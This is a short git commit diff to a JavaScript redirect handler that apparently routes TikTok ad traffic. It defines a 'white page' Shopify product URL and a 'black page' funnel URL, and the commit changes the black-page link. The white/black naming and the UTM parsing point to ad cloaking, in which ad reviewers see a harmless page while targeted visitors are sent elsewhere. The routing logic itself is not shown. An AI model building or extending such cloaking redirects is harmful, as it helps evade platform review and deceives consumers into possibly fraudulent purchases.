1bba8bc5f625bba66958c4a040b32decc4bd785a
TalhaRai2017 <137892001+TalhaRai2017@users.noreply.github.com>
2025-03-12 19:25:24 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://zoha-los-angeles.myshopify.com/products/clutchp?variant=12394621370427&utm_source=tiktok&utm_medium=paid&utm_id=__CAMPAIGN_ID__&utm_campaign=__CAMPAIGN_NAME__";
-    const blackPageURL = "https://jshzuaudhsuay9231.myfunnelish.com/chelsea-boden-boots-1737374791461610";
+    const blackPageURL = "https://jshzuaudhsuay9231.myfunnelish.com/6c6b385e-de5b-409e-b174-68f4e7223f8f-1741107899368410-1741185517334729-1741789354488139";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
